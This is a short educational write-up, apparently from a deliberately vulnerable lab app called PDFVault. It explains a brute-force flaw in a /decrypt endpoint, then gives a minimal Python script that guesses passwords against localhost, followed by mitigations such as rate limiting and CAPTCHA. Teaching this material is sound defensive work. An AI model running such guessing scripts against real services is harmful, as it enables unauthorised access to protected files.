# Brute-Force Attacks

## The Flaw
The `/decrypt` endpoint in PDFVault allows unlimited attempts to guess the password. There is:
- **No Rate Limiting**: You can send 10,000 requests per second.
- **No Account Lockout**: The file never "locks" after failed attempts.
- **Verbose Error Messages**: The server explicitly tells you "Incorrect password", confirming the file exists and the username/logic is valid, just the credential is wrong.

## Exploitation
An attacker can script a brute-force attack against the web interface itself (Online Attack).

### Python Script Example (Concept)
```python
import requests

url = "http://localhost:5000/decrypt"
passwords = ["12345", "password", "admin", "secret"]

for p in passwords:
    r = requests.post(url, data={'filename': 'enc_test.pdf', 'password': p})
    if "SUCCESS" in r.text:
        print(f"Password found: {p}")
        break
```

## Mitigation
- Implement **Rate Limiting** (e.g., 5 attempts per minute).
- Use **CAPTCHA** after failed attempts.
- Implement **Exponential Backoff** delays.
- Generic error messages (though less relevant for decryption than login).
